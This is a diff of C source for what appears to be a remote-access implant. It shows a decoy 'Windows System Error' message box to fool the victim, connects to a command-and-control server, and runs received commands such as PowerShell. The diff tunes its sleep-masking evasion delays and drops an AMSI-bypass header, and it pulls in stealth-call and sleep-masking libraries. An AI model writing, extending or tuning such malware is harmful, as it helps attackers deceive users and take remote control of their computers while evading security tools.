@@ -7,7 +7,6 @@
 #include "Lib/StealthCall.h"
 #include "Lib/SleepMasking.h"
 #include "Lib/Wrappers.h"
-#include "Lib/AMSIBypass.h"
 
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "wininet.lib")
@@ -18,7 +17,7 @@
 
 int main() {
     MessageBoxA(NULL, "Error 0x41da0: Graphic driver not reconized, your computer may be not compatible with this version of the utility.", "[0x41da0] Windows System Error", MB_ICONERROR);
-    GoDark(7000);
+    GoDark(3000);
     SOCKET c2Socket;
     PC2_PACKET pkt = calloc(1, sizeof(C2_PACKET));
     BOOL loop = 1;
@@ -27,10 +26,10 @@ int main() {
     SetupConstants();
 
     ConnectToC2(&c2Socket);
-    GoDark(5000);
+    GoDark(1000);
     while(loop) {
         recvC2Packet(&c2Socket, pkt);
-        GoDark(5000);
+        GoDark(2000);
         switch(pkt->CmdId) {
             case 0x1:
                 printf("[C2] Received command ID 1 for {executePowershell}\n");
@@ -61,7 +60,8 @@ int main() {
                 loop = 0;
                 break;
         }
-        GoDark(15000);
+        //GoDark(15000);
+        GoDark(2000);
     }
 cleanup: 
     if(pe) VirtualFree(pe, 0, MEM_RELEASE);
